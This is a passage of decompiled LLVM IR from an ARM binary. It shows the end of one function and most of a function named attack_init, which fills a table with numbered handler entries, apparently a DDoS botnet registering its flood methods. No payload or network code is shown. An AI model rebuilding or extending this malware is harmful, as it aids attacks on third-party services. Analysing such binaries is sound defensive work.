  store i32 %v4_8544, i32* %r3.global-to-local, align 4
  %v9_8548 = icmp eq i8 %v3_8544, %v3_8354
  store i1 %v9_8548, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8548, label %dec_label_pc_8570, label %dec_label_pc_8550

dec_label_pc_8550:                                ; preds = %dec_label_pc_8534, %dec_label_pc_855c
  %v0_8550 = phi i32 [ %v1_8550, %dec_label_pc_855c ], [ 0, %dec_label_pc_8534 ]
  %v1_8550 = add i32 %v0_8550, 1
  %v9_8554 = icmp eq i32 %v1_8550, %v3_8528
  store i1 %v9_8554, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8554, label %dec_label_pc_8590, label %dec_label_pc_855c

dec_label_pc_855c:                                ; preds = %dec_label_pc_8550
  %v4_855c = mul i32 %v1_8550, 4
  %v5_855c = add i32 %v4_855c, %v2_8538
  %v6_855c = inttoptr i32 %v5_855c to i32*
  %v7_855c = load i32, i32* %v6_855c, align 4
  store i32 %v7_855c, i32* %ip.global-to-local, align 4
  %v1_8564 = add i32 %v7_855c, 4
  %v2_8564 = inttoptr i32 %v1_8564 to i8*
  %v3_8564 = load i8, i8* %v2_8564, align 1
  %v4_8564 = zext i8 %v3_8564 to i32
  store i32 %v4_8564, i32* %r3.global-to-local, align 4
  %v9_8568 = icmp eq i8 %v3_8564, %v3_8354
  store i1 %v9_8568, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8568, label %dec_label_pc_8570, label %dec_label_pc_8550

dec_label_pc_8570:                                ; preds = %dec_label_pc_855c, %dec_label_pc_8534
  %v0_8584 = phi i32 [ %v2_853c, %dec_label_pc_8534 ], [ %v7_855c, %dec_label_pc_855c ]
  store i32 %v5_8344, i32* %r0.global-to-local, align 4
  %v0_8578 = load i32, i32* @sb, align 4
  store i32 %v0_8578, i32* %r1.global-to-local, align 4
  %v0_8580 = load i32, i32* @r5, align 4
  store i32 %v0_8580, i32* %r3.global-to-local, align 4
  %v1_8584 = inttoptr i32 %v0_8584 to i32*
  %v2_8584 = load i32, i32* %v1_8584, align 4
  store i32 %v2_8584, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v2_8584)
  br label %dec_label_pc_8590

dec_label_pc_8590:                                ; preds = %dec_label_pc_8550, %dec_label_pc_8524, %dec_label_pc_8570
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_8594 = call i32 @__GI_exit(i32 0)
  store i32 %v1_8594, i32* %r0.global-to-local, align 4
  %v0_8598 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8598, label %bb54, label %.thread17

bb54:                                             ; preds = %dec_label_pc_8590
  br label %.thread17

.thread17:                                        ; preds = %dec_label_pc_8590, %bb54
  ret i32 %v1_8594

; uselistorder directives
  uselistorder i1 %v9_8568, { 1, 0 }
  uselistorder i32 %v1_8550, { 1, 2, 0 }
  uselistorder i1 %v9_8548, { 1, 0 }
  uselistorder i32 %v0_851c, { 1, 0 }
  uselistorder i32 %v1_850c, { 1, 2, 0 }
  uselistorder i1 %v2_84e0, { 0, 2, 1 }
  uselistorder i1 %v2_84d4, { 1, 0 }
  uselistorder i1 %v7_84bc, { 1, 0 }
  uselistorder i32 %v0_84b8, { 2, 1, 0, 3 }
  uselistorder i32 %v0_84a4, { 1, 0 }
  uselistorder i32 %v2_8474, { 1, 0 }
  uselistorder i32 %v1_8470, { 2, 0, 1, 3 }
  uselistorder i32 %v4_846c, { 0, 2, 1, 3 }
  uselistorder i32 %v3_8450, { 1, 0 }
  uselistorder i32 %v3_83e4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_83d4, { 1, 0 }
  uselistorder i32 %v1_83d0, { 1, 0 }
  uselistorder i32 %v2_8390, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v4_8364, { 1, 0, 2, 3 }
  uselistorder i32 %v5_8344, { 1, 0 }
  uselistorder i32 %v1_8330, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v2_832c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_8318, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 6, 7, 8, 9, 10, 11, 0, 12, 13, 14, 15, 1, 2, 3, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 10, 11, 2, 3, 12, 13, 1, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 17, 14, 15, 16, 20, 18, 21, 19, 22, 23, 2, 4, 3, 10, 11, 5, 6, 7, 8, 9, 12, 13, 0, 1 }
  uselistorder i32* %ip.global-to-local, { 6, 7, 8, 0, 1, 2, 3, 4, 5 }
  uselistorder i1* %cpsr_z.global-to-local, { 19, 16, 17, 18, 20, 21, 22, 23, 24, 25, 26, 0, 27, 2, 28, 29, 30, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder label %.thread17, { 1, 0 }
  uselistorder label %dec_label_pc_8590, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8550, { 1, 0 }
  uselistorder label %bb52, { 1, 0 }
  uselistorder label %dec_label_pc_84dc, { 8, 4, 1, 2, 0, 3, 5, 6, 7 }
  uselistorder label %dec_label_pc_8484, { 1, 0 }
  uselistorder label %dec_label_pc_8320, { 6, 1, 0, 2, 3, 4, 5 }
}

define i32 @attack_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_85a0 = load i32, i32* @r4, align 4
  store i32 %v3_85a0, i32* %stack_var_-24, align 4
  %v6_85a0 = load i32, i32* @r5, align 4
  %v9_85a0 = load i32, i32* @r6, align 4
  %v12_85a0 = load i32, i32* @r7, align 4
  %v15_85a0 = load i32, i32* @r8, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_85ac = call i32 @calloc(i32 1, i32 8)
  store i32 ptrtoint (i8** @global_var_24694.31 to i32), i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_24698.33 to i32), i32* @r6, align 4
  store i32 52348, i32* %r2.global-to-local, align 4
  store i32 %v2_85ac, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_24695.37 to i32), i32* %r1.global-to-local, align 4
  %v2_85cc = load i32, i32* @global_var_24698.33, align 4
  %v2_85d0 = inttoptr i32 %v2_85ac to i32*
  store i32 52348, i32* %v2_85d0, align 4
  %v3_85d4 = load i32, i32* @r4, align 4
  %v4_85d4 = add i32 %v3_85d4, 4
  %v5_85d4 = inttoptr i32 %v4_85d4 to i8*
  store i8 0, i8* %v5_85d4, align 1
  %v0_85d8 = load i32, i32* %r1.global-to-local, align 4
  %v3_85d8 = mul i32 %v0_85d8, 4
  store i32 %v3_85d8, i32* %r1.global-to-local, align 4
  %v5_85dc = inttoptr i32 %v2_85cc to i32*
  %v6_85dc = call i32 @realloc(i32* %v5_85dc, i32 %v3_85d8, i32 52348, i32 0)
  %v2_85e0 = load i8, i8* bitcast (i8** @global_var_24694.31 to i8*), align 4
  %v3_85e0 = zext i8 %v2_85e0 to i32
  store i32 %v6_85dc, i32* %r2.global-to-local, align 4
  %v0_85e8 = load i32, i32* @r4, align 4
  %v5_85e8 = mul nuw nsw i32 %v3_85e0, 4
  %v6_85e8 = add i32 %v5_85e8, %v6_85dc
  %v7_85e8 = inttoptr i32 %v6_85e8 to i32*
  store i32 %v0_85e8, i32* %v7_85e8, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_24695.37 to i32), i32* %r3.global-to-local, align 4
  %v1_85f8 = load i32, i32* @r6, align 4
  %v2_85f8 = inttoptr i32 %v1_85f8 to i32*
  store i32 %v6_85dc, i32* %v2_85f8, align 4
  %v0_85fc = load i32, i32* %r3.global-to-local, align 4
  %v1_85fc = trunc i32 %v0_85fc to i8
  %v2_85fc = load i32, i32* @r5, align 4
  %v3_85fc = inttoptr i32 %v2_85fc to i8*
  store i8 %v1_85fc, i8* %v3_85fc, align 1
  %v2_8600 = call i32 @calloc(i32 1, i32 8)
  store i32 ptrtoint (i32* @global_var_d248.39 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* @r8, align 4
  store i32 %v2_8600, i32* @r4, align 4
  store i32 ptrtoint (i8* @global_var_24695.37 to i32), i32* %r1.global-to-local, align 4
  %v2_8618 = load i32, i32* @global_var_24698.33, align 4
  %v2_861c = inttoptr i32 %v2_8600 to i32*
  store i32 ptrtoint (i32* @global_var_d248.39 to i32), i32* %v2_861c, align 4
  %v0_8620 = load i32, i32* @r8, align 4
  %v1_8620 = trunc i32 %v0_8620 to i8
  %v2_8620 = load i32, i32* @r4, align 4
  %v3_8620 = add i32 %v2_8620, 4
  %v4_8620 = inttoptr i32 %v3_8620 to i8*
  store i8 %v1_8620, i8* %v4_8620, align 1
  %v0_8624 = load i32, i32* %r1.global-to-local, align 4
  %v3_8624 = mul i32 %v0_8624, 4
  store i32 %v3_8624, i32* %r1.global-to-local, align 4
  %v4_8628 = inttoptr i32 %v2_8618 to i32*
  %v5_8628 = call i32 @realloc(i32* %v4_8628, i32 %v3_8624, i32 %v6_85dc, i32 ptrtoint (i32* @global_var_d248.39 to i32))
  %v2_862c = load i8, i8* bitcast (i8** @global_var_24694.31 to i8*), align 4
  %v3_862c = zext i8 %v2_862c to i32
  store i32 %v3_862c, i32* %r3.global-to-local, align 4
  store i32 %v5_8628, i32* %r2.global-to-local, align 4
  %v0_8634 = load i32, i32* @r4, align 4
  %v5_8634 = mul nuw nsw i32 %v3_862c, 4
  %v6_8634 = add i32 %v5_8634, %v5_8628
  %v7_8634 = inttoptr i32 %v6_8634 to i32*
  store i32 %v0_8634, i32* %v7_8634, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_863c = load i32, i32* %r3.global-to-local, align 4
  %v1_863c = load i32, i32* @r8, align 4
  %v2_863c = add i32 %v1_863c, %v0_863c
  store i32 %v2_863c, i32* %r3.global-to-local, align 4
  %v1_8644 = trunc i32 %v2_863c to i8
  %v2_8644 = load i32, i32* @r5, align 4
  %v3_8644 = inttoptr i32 %v2_8644 to i8*
  store i8 %v1_8644, i8* %v3_8644, align 1
  %v0_8648 = load i32, i32* %r2.global-to-local, align 4
  %v1_8648 = load i32, i32* @r6, align 4
  %v2_8648 = inttoptr i32 %v1_8648 to i32*
  store i32 %v0_8648, i32* %v2_8648, align 4
  %v2_864c = call i32 @calloc(i32 %v1_863c, i32 8)
  %v2_8650 = load i8, i8* bitcast (i8** @global_var_24694.31 to i8*), align 4
  %v3_8650 = zext i8 %v2_8650 to i32
  store i32 ptrtoint (i32* @global_var_d6b4.41 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_864c, i32* @r4, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_8660 = load i32, i32* @r8, align 4
  %v2_8660 = add i32 %v1_8660, %v3_8650
  store i32 %v2_8660, i32* %r1.global-to-local, align 4
  %v2_8664 = load i32, i32* @global_var_24698.33, align 4
  %v2_8668 = inttoptr i32 %v2_864c to i32*
  store i32 ptrtoint (i32* @global_var_d6b4.41 to i32), i32* %v2_8668, align 4
  %v3_866c = load i32, i32* @r4, align 4
  %v4_866c = add i32 %v3_866c, 4
  %v5_866c = inttoptr i32 %v4_866c to i8*
  store i8 2, i8* %v5_866c, align 1
  %v0_8670 = load i32, i32* %r1.global-to-local, align 4
  %v3_8670 = mul i32 %v0_8670, 4
  store i32 %v3_8670, i32* %r1.global-to-local, align 4
  %v5_8674 = inttoptr i32 %v2_8664 to i32*
  %v6_8674 = call i32 @realloc(i32* %v5_8674, i32 %v3_8670, i32 ptrtoint (i32* @global_var_d6b4.41 to i32), i32 2)
  %v2_8678 = load i8, i8* bitcast (i8** @global_var_24694.31 to i8*), align 4
  %v3_8678 = zext i8 %v2_8678 to i32
  store i32 %v3_8678, i32* %r3.global-to-local, align 4
  store i32 %v6_8674, i32* %r2.global-to-local, align 4
  %v0_8680 = load i32, i32* @r4, align 4
  %v5_8680 = mul nuw nsw i32 %v3_8678, 4
  %v6_8680 = add i32 %v5_8680, %v6_8674
  %v7_8680 = inttoptr i32 %v6_8680 to i32*
  store i32 %v0_8680, i32* %v7_8680, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_8688 = load i32, i32* %r3.global-to-local, align 4
  %v1_8688 = load i32, i32* @r8, align 4
  %v2_8688 = add i32 %v1_8688, %v0_8688
  store i32 %v2_8688, i32* %r3.global-to-local, align 4
  %v1_8690 = load i32, i32* @r6, align 4
  %v2_8690 = inttoptr i32 %v1_8690 to i32*
  store i32 %v6_8674, i32* %v2_8690, align 4
  %v0_8694 = load i32, i32* %r3.global-to-local, align 4
  %v1_8694 = trunc i32 %v0_8694 to i8
  %v2_8694 = load i32, i32* @r5, align 4
  %v3_8694 = inttoptr i32 %v2_8694 to i8*
  store i8 %v1_8694, i8* %v3_8694, align 1
  %v2_8698 = call i32 @calloc(i32 %v1_8688, i32 8)
  %v2_869c = load i8, i8* bitcast (i8** @global_var_24694.31 to i8*), align 4
  %v3_869c = zext i8 %v2_869c to i32
  store i32 ptrtoint (i32* @global_var_c9bc.43 to i32), i32* %r3.global-to-local, align 4
  store i32 8, i32* @r7, align 4
  store i32 %v2_8698, i32* @r4, align 4
  %v1_86ac = load i32, i32* @r8, align 4
  %v2_86ac = add i32 %v1_86ac, %v3_869c
  store i32 %v2_86ac, i32* %r1.global-to-local, align 4
  %v2_86b0 = load i32, i32* @global_var_24698.33, align 4
  %v2_86b4 = inttoptr i32 %v2_8698 to i32*
  store i32 ptrtoint (i32* @global_var_c9bc.43 to i32), i32* %v2_86b4, align 4
  %v0_86b8 = load i32, i32* @r7, align 4
  %v1_86b8 = trunc i32 %v0_86b8 to i8
  %v2_86b8 = load i32, i32* @r4, align 4
  %v3_86b8 = add i32 %v2_86b8, 4
  %v4_86b8 = inttoptr i32 %v3_86b8 to i8*
  store i8 %v1_86b8, i8* %v4_86b8, align 1
  %v0_86bc = load i32, i32* %r1.global-to-local, align 4
  %v3_86bc = mul i32 %v0_86bc, 4
  store i32 %v3_86bc, i32* %r1.global-to-local, align 4
  %v4_86c0 = inttoptr i32 %v2_86b0 to i32*
  %v5_86c0 = call i32 @realloc(i32* %v4_86c0, i32 %v3_86bc, i32 %v6_8674, i32 ptrtoint (i32* @global_var_c9bc.43 to i32))
  %v2_86c4 = load i8, i8* bitcast (i8** @global_var_24694.31 to i8*), align 4
  %v3_86c4 = zext i8 %v2_86c4 to i32
  store i32 %v3_86c4, i32* %r3.global-to-local, align 4
  store i32 %v5_86c0, i32* %r2.global-to-local, align 4
  %v0_86cc = load i32, i32* @r4, align 4
  %v5_86cc = mul nuw nsw i32 %v3_86c4, 4
  %v6_86cc = add i32 %v5_86cc, %v5_86c0
  %v7_86cc = inttoptr i32 %v6_86cc to i32*
  store i32 %v0_86cc, i32* %v7_86cc, align 4
  %v0_86d0 = load i32, i32* @r7, align 4
  store i32 %v0_86d0, i32* %r1.global-to-local, align 4
  %v0_86d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_86d4 = load i32, i32* @r8, align 4
  %v2_86d4 = add i32 %v1_86d4, %v0_86d4
  store i32 %v2_86d4, i32* %r3.global-to-local, align 4
  %v1_86dc = trunc i32 %v2_86d4 to i8
  %v2_86dc = load i32, i32* @r5, align 4
  %v3_86dc = inttoptr i32 %v2_86dc to i8*
  store i8 %v1_86dc, i8* %v3_86dc, align 1
  %v0_86e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_86e0 = load i32, i32* @r6, align 4
  %v2_86e0 = inttoptr i32 %v1_86e0 to i32*
  store i32 %v0_86e0, i32* %v2_86e0, align 4
  %v2_86e4 = call i32 @calloc(i32 %v1_86d4, i32 %v0_86d0)
  %v2_86e8 = load i8, i8* bitcast (i8** @global_var_24694.31 to i8*), align 4
  %v3_86e8 = zext i8 %v2_86e8 to i32
  store i32 ptrtoint (i32* @global_var_c2e4.45 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_86e4, i32* @r4, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_86f8 = load i32, i32* @r8, align 4
  %v2_86f8 = add i32 %v1_86f8, %v3_86e8
  store i32 %v2_86f8, i32* %r1.global-to-local, align 4
  %v2_86fc = load i32, i32* @global_var_24698.33, align 4
  %v2_8700 = inttoptr i32 %v2_86e4 to i32*
  store i32 ptrtoint (i32* @global_var_c2e4.45 to i32), i32* %v2_8700, align 4
  %v3_8704 = load i32, i32* @r4, align 4
  %v4_8704 = add i32 %v3_8704, 4
  %v5_8704 = inttoptr i32 %v4_8704 to i8*
  store i8 3, i8* %v5_8704, align 1
  %v0_8708 = load i32, i32* %r1.global-to-local, align 4
  %v3_8708 = mul i32 %v0_8708, 4
  store i32 %v3_8708, i32* %r1.global-to-local, align 4
  %v5_870c = inttoptr i32 %v2_86fc to i32*
  %v6_870c = call i32 @realloc(i32* %v5_870c, i32 %v3_8708, i32 ptrtoint (i32* @global_var_c2e4.45 to i32), i32 3)
  %v2_8710 = load i8, i8* bitcast (i8** @global_var_24694.31 to i8*), align 4
  %v3_8710 = zext i8 %v2_8710 to i32
  store i32 %v3_8710, i32* %r3.global-to-local, align 4
  store i32 %v6_870c, i32* %r2.global-to-local, align 4
  %v0_8718 = load i32, i32* @r4, align 4
  %v5_8718 = mul nuw nsw i32 %v3_8710, 4
  %v6_8718 = add i32 %v5_8718, %v6_870c
  %v7_8718 = inttoptr i32 %v6_8718 to i32*
  store i32 %v0_8718, i32* %v7_8718, align 4
  %v0_871c = load i32, i32* @r7, align 4
  store i32 %v0_871c, i32* %r1.global-to-local, align 4
  %v0_8720 = load i32, i32* %r3.global-to-local, align 4
  %v1_8720 = load i32, i32* @r8, align 4
  %v2_8720 = add i32 %v1_8720, %v0_8720
  store i32 %v2_8720, i32* %r3.global-to-local, align 4
  %v1_8728 = trunc i32 %v2_8720 to i8
  %v2_8728 = load i32, i32* @r5, align 4
  %v3_8728 = inttoptr i32 %v2_8728 to i8*
  store i8 %v1_8728, i8* %v3_8728, align 1
  %v0_872c = load i32, i32* %r2.global-to-local, align 4
  %v1_872c = load i32, i32* @r6, align 4
  %v2_872c = inttoptr i32 %v1_872c to i32*
  store i32 %v0_872c, i32* %v2_872c, align 4
  %v2_8730 = call i32 @calloc(i32 %v1_8720, i32 %v0_871c)
  %v2_8734 = load i8, i8* bitcast (i8** @global_var_24694.31 to i8*), align 4
  %v3_8734 = zext i8 %v2_8734 to i32
  store i32 ptrtoint (i32* @global_var_bbc0.47 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8730, i32* @r4, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v1_8744 = load i32, i32* @r8, align 4
  %v2_8744 = add i32 %v1_8744, %v3_8734
  store i32 %v2_8744, i32* %r1.global-to-local, align 4
  %v2_8748 = load i32, i32* @global_var_24698.33, align 4
  %v2_874c = inttoptr i32 %v2_8730 to i32*
  store i32 ptrtoint (i32* @global_var_bbc0.47 to i32), i32* %v2_874c, align 4
  %v3_8750 = load i32, i32* @r4, align 4
  %v4_8750 = add i32 %v3_8750, 4
  %v5_8750 = inttoptr i32 %v4_8750 to i8*
  store i8 4, i8* %v5_8750, align 1
  %v0_8754 = load i32, i32* %r1.global-to-local, align 4
  %v3_8754 = mul i32 %v0_8754, 4
  store i32 %v3_8754, i32* %r1.global-to-local, align 4
  %v5_8758 = inttoptr i32 %v2_8748 to i32*
  %v6_8758 = call i32 @realloc(i32* %v5_8758, i32 %v3_8754, i32 ptrtoint (i32* @global_var_bbc0.47 to i32), i32 4)
  %v2_875c = load i8, i8* bitcast (i8** @global_var_24694.31 to i8*), align 4
  %v3_875c = zext i8 %v2_875c to i32
  store i32 %v3_875c, i32* %r3.global-to-local, align 4
  store i32 %v6_8758, i32* %r2.global-to-local, align 4
  %v0_8764 = load i32, i32* @r4, align 4
  %v5_8764 = mul nuw nsw i32 %v3_875c, 4
  %v6_8764 = add i32 %v5_8764, %v6_8758
  %v7_8764 = inttoptr i32 %v6_8764 to i32*
  store i32 %v0_8764, i32* %v7_8764, align 4
  %v0_8768 = load i32, i32* @r7, align 4
  store i32 %v0_8768, i32* %r1.global-to-local, align 4
  %v0_876c = load i32, i32* %r3.global-to-local, align 4
  %v1_876c = load i32, i32* @r8, align 4
  %v2_876c = add i32 %v1_876c, %v0_876c
  store i32 %v2_876c, i32* %r3.global-to-local, align 4
  %v1_8774 = trunc i32 %v2_876c to i8
  %v2_8774 = load i32, i32* @r5, align 4
  %v3_8774 = inttoptr i32 %v2_8774 to i8*
  store i8 %v1_8774, i8* %v3_8774, align 1
  %v0_8778 = load i32, i32* %r2.global-to-local, align 4
  %v1_8778 = load i32, i32* @r6, align 4
  %v2_8778 = inttoptr i32 %v1_8778 to i32*
  store i32 %v0_8778, i32* %v2_8778, align 4
  %v2_877c = call i32 @calloc(i32 %v1_876c, i32 %v0_8768)
  %v2_8780 = load i8, i8* bitcast (i8** @global_var_24694.31 to i8*), align 4
  %v3_8780 = zext i8 %v2_8780 to i32
  store i32 ptrtoint (i32* @global_var_b394.49 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_877c, i32* @r4, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v1_8790 = load i32, i32* @r8, align 4
  %v2_8790 = add i32 %v1_8790, %v3_8780
  store i32 %v2_8790, i32* %r1.global-to-local, align 4
  %v2_8794 = load i32, i32* @global_var_24698.33, align 4
  %v2_8798 = inttoptr i32 %v2_877c to i32*
  store i32 ptrtoint (i32* @global_var_b394.49 to i32), i32* %v2_8798, align 4
  %v3_879c = load i32, i32* @r4, align 4
  %v4_879c = add i32 %v3_879c, 4
  %v5_879c = inttoptr i32 %v4_879c to i8*
  store i8 5, i8* %v5_879c, align 1
  %v0_87a0 = load i32, i32* %r1.global-to-local, align 4
  %v3_87a0 = mul i32 %v0_87a0, 4
  store i32 %v3_87a0, i32* %r1.global-to-local, align 4
  %v5_87a4 = inttoptr i32 %v2_8794 to i32*
  %v6_87a4 = call i32 @realloc(i32* %v5_87a4, i32 %v3_87a0, i32 ptrtoint (i32* @global_var_b394.49 to i32), i32 5)
  %v2_87a8 = load i8, i8* bitcast (i8** @global_var_24694.31 to i8*), align 4
  %v3_87a8 = zext i8 %v2_87a8 to i32
  store i32 %v3_87a8, i32* %r3.global-to-local, align 4
  store i32 %v6_87a4, i32* %r2.global-to-local, align 4
  %v0_87b0 = load i32, i32* @r4, align 4
  %v5_87b0 = mul nuw nsw i32 %v3_87a8, 4
  %v6_87b0 = add i32 %v5_87b0, %v6_87a4
  %v7_87b0 = inttoptr i32 %v6_87b0 to i32*
  store i32 %v0_87b0, i32* %v7_87b0, align 4
  %v0_87b4 = load i32, i32* @r7, align 4
  store i32 %v0_87b4, i32* %r1.global-to-local, align 4
  %v0_87b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_87b8 = load i32, i32* @r8, align 4
  %v2_87b8 = add i32 %v1_87b8, %v0_87b8
  store i32 %v2_87b8, i32* %r3.global-to-local, align 4
  %v1_87c0 = trunc i32 %v2_87b8 to i8
  %v2_87c0 = load i32, i32* @r5, align 4
  %v3_87c0 = inttoptr i32 %v2_87c0 to i8*
  store i8 %v1_87c0, i8* %v3_87c0, align 1
  %v0_87c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_87c4 = load i32, i32* @r6, align 4
  %v2_87c4 = inttoptr i32 %v1_87c4 to i32*
  store i32 %v0_87c4, i32* %v2_87c4, align 4
  %v2_87c8 = call i32 @calloc(i32 %v1_87b8, i32 %v0_87b4)
  %v2_87cc = load i8, i8* bitcast (i8** @global_var_24694.31 to i8*), align 4
  %v3_87cc = zext i8 %v2_87cc to i32
  store i32 ptrtoint (i32* @global_var_ad34.51 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_87c8, i32* @r4, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v1_87dc = load i32, i32* @r8, align 4
  %v2_87dc = add i32 %v1_87dc, %v3_87cc
  store i32 %v2_87dc, i32* %r1.global-to-local, align 4
  %v2_87e0 = load i32, i32* @global_var_24698.33, align 4
  %v2_87e4 = inttoptr i32 %v2_87c8 to i32*
  store i32 ptrtoint (i32* @global_var_ad34.51 to i32), i32* %v2_87e4, align 4
  %v3_87e8 = load i32, i32* @r4, align 4
  %v4_87e8 = add i32 %v3_87e8, 4
  %v5_87e8 = inttoptr i32 %v4_87e8 to i8*
  store i8 6, i8* %v5_87e8, align 1
  %v0_87ec = load i32, i32* %r1.global-to-local, align 4
  %v3_87ec = mul i32 %v0_87ec, 4
  store i32 %v3_87ec, i32* %r1.global-to-local, align 4
  %v5_87f0 = inttoptr i32 %v2_87e0 to i32*
  %v6_87f0 = call i32 @realloc(i32* %v5_87f0, i32 %v3_87ec, i32 ptrtoint (i32* @global_var_ad34.51 to i32), i32 6)
  %v2_87f4 = load i8, i8* bitcast (i8** @global_var_24694.31 to i8*), align 4
  %v3_87f4 = zext i8 %v2_87f4 to i32
  store i32 %v3_87f4, i32* %r3.global-to-local, align 4
  store i32 %v6_87f0, i32* %r2.global-to-local, align 4
  %v0_87fc = load i32, i32* @r4, align 4
  %v5_87fc = mul nuw nsw i32 %v3_87f4, 4
  %v6_87fc = add i32 %v5_87fc, %v6_87f0
  %v7_87fc = inttoptr i32 %v6_87fc to i32*
  store i32 %v0_87fc, i32* %v7_87fc, align 4
  %v0_8800 = load i32, i32* @r7, align 4
  store i32 %v0_8800, i32* %r1.global-to-local, align 4
  %v0_8804 = load i32, i32* %r3.global-to-local, align 4
  %v1_8804 = load i32, i32* @r8, align 4
  %v2_8804 = add i32 %v1_8804, %v0_8804
  store i32 %v2_8804, i32* %r3.global-to-local, align 4
  %v1_880c = trunc i32 %v2_8804 to i8
  %v2_880c = load i32, i32* @r5, align 4
  %v3_880c = inttoptr i32 %v2_880c to i8*
  store i8 %v1_880c, i8* %v3_880c, align 1
  %v0_8810 = load i32, i32* %r2.global-to-local, align 4
  %v1_8810 = load i32, i32* @r6, align 4
  %v2_8810 = inttoptr i32 %v1_8810 to i32*
  store i32 %v0_8810, i32* %v2_8810, align 4
  %v2_8814 = call i32 @calloc(i32 %v1_8804, i32 %v0_8800)
  %v2_8818 = load i8, i8* bitcast (i8** @global_var_24694.31 to i8*), align 4
  %v3_8818 = zext i8 %v2_8818 to i32
  store i32 42604, i32* %r2.global-to-local, align 4
  store i32 %v2_8814, i32* @r4, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v1_8828 = load i32, i32* @r8, align 4
  %v2_8828 = add i32 %v1_8828, %v3_8818
  store i32 %v2_8828, i32* %r1.global-to-local, align 4
  %v2_882c = load i32, i32* @global_var_24698.33, align 4
  %v2_8830 = inttoptr i32 %v2_8814 to i32*
  store i32 42604, i32* %v2_8830, align 4
  %v3_8834 = load i32, i32* @r4, align 4
  %v4_8834 = add i32 %v3_8834, 4
  %v5_8834 = inttoptr i32 %v4_8834 to i8*
  store i8 7, i8* %v5_8834, align 1
  %v0_8838 = load i32, i32* %r1.global-to-local, align 4
  %v3_8838 = mul i32 %v0_8838, 4
  store i32 %v3_8838, i32* %r1.global-to-local, align 4
  %v5_883c = inttoptr i32 %v2_882c to i32*
  %v6_883c = call i32 @realloc(i32* %v5_883c, i32 %v3_8838, i32 42604, i32 7)
  %v2_8840 = load i8, i8* bitcast (i8** @global_var_24694.31 to i8*), align 4
  %v3_8840 = zext i8 %v2_8840 to i32
  store i32 %v3_8840, i32* %r3.global-to-local, align 4
  store i32 %v6_883c, i32* %r2.global-to-local, align 4
  %v0_8848 = load i32, i32* @r4, align 4
  %v5_8848 = mul nuw nsw i32 %v3_8840, 4
  %v6_8848 = add i32 %v5_8848, %v6_883c
  %v7_8848 = inttoptr i32 %v6_8848 to i32*
  store i32 %v0_8848, i32* %v7_8848, align 4
  %v0_884c = load i32, i32* @r7, align 4
  store i32 %v0_884c, i32* %r1.global-to-local, align 4
  %v0_8850 = load i32, i32* %r3.global-to-local, align 4
  %v1_8850 = load i32, i32* @r8, align 4
  %v2_8850 = add i32 %v1_8850, %v0_8850
  store i32 %v2_8850, i32* %r3.global-to-local, align 4
  %v1_8858 = trunc i32 %v2_8850 to i8
  %v2_8858 = load i32, i32* @r5, align 4
  %v3_8858 = inttoptr i32 %v2_8858 to i8*
  store i8 %v1_8858, i8* %v3_8858, align 1
  %v0_885c = load i32, i32* %r2.global-to-local, align 4
  %v1_885c = load i32, i32* @r6, align 4
  %v2_885c = inttoptr i32 %v1_885c to i32*
  store i32 %v0_885c, i32* %v2_885c, align 4
  %v2_8860 = call i32 @calloc(i32 %v1_8850, i32 %v0_884c)
  %v2_8864 = load i8, i8* bitcast (i8** @global_var_24694.31 to i8*), align 4
  %v3_8864 = zext i8 %v2_8864 to i32
  store i32 ptrtoint (i32* @global_var_88dc.54 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8860, i32* @r4, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v1_8874 = load i32, i32* @r8, align 4
  %v2_8874 = add i32 %v1_8874, %v3_8864
  store i32 %v2_8874, i32* %r1.global-to-local, align 4
  %v2_8878 = load i32, i32* @global_var_24698.33, align 4
  %v2_887c = inttoptr i32 %v2_8860 to i32*
  store i32 ptrtoint (i32* @global_var_88dc.54 to i32), i32* %v2_887c, align 4
  %v3_8880 = load i32, i32* @r4, align 4
  %v4_8880 = add i32 %v3_8880, 4
  %v5_8880 = inttoptr i32 %v4_8880 to i8*
  store i8 9, i8* %v5_8880, align 1
  %v0_8884 = load i32, i32* %r1.global-to-local, align 4
